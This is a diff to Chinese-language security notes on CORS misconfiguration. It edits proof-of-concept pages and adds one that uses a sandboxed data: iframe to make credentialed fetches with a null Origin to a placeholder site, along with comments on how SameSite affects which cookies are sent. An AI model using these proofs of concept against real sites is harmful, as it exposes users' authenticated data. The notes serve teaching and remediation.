@@ -290,7 +290,7 @@ var invocation = new XMLHttpRequest();
 
   invocation.onreadystatechange = function() {
     if (invocation.readyState == XMLHttpRequest.DONE) {
-      alert(invocation.response);
+      console.log(invocation.response); // output result
     }
   }
 
@@ -327,7 +327,7 @@ function cors() {
 </script>
 ```
 
-PoC3: poc3_cors_FetchAPI.html
+PoC3: poc3_cors__with__FetchAPI.html
 
 * "跨站信息泄露"(cross-site leak). 当满足以下2个条件时, 通过"读取硬盘缓存的Response"可获取到之前的Response(更可能有敏感数据)! 参考#761726
   * 条件1. 目标站存在CORS漏洞.
@@ -335,7 +335,7 @@ PoC3: poc3_cors_FetchAPI.html
 ```html
 <html>
 <script>
-var url1 = "https://B.com/x.json"; // B.com has the CORS misconfiguration.
+var url1 = "https://B.com/x.json"; // B.com has the CORS misconfiguration!
 
 obj1 = {    
     method: 'GET',    
@@ -348,11 +348,27 @@ fetch(url1,obj1)
     return response.json(); // Promise
   })
   .then(function(Json1) {
-    console.log(Json1); //output
+    console.log(Json1); // output result
   });
 
 </script>
 </html>
+```
+
+PoC4: poc4_cors__for__Origin_null__with__iframe.html
+```html
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src='data:text/html,<script> var url1 = "https://B.com/x.json"; obj1 = {method:"GET",mode: "cors",credentials:"include",};fetch(url1,obj1).then(function(response) {return response.text(); return response.json();}).then(function(Json1) {console.log(Json1);});</script>'></iframe>
+```
+
+```javascript
+credentials: "include" //表示发送HTTP请求到目标域 会带上浏览器存储的这个目标域的(一部分)cookie
+// 在Chrome浏览器下, 具体能带上目标域的哪些cookie呢? 
+// (只?)取决于 这个cookie的 SameSite属性的值!  与httponly属性没有任何关系.
+// 情况(1) 如果某个cookie的SameSite属性的值为 None 
+//        那么这个cookie 能够 被HTTP请求带上.
+//        这些cookie 被它的server显式指定了SameSite属性的值.
+// 情况(2) 如果某个cookie的SameSite属性的值为 空 则默认值为Lax(Chrome >= 80)
+//        那么这个cookie 不能 被HTTP请求带上!
 ```
 
 * 使用CORS实现跨域 **安全的方案(修复方案)**
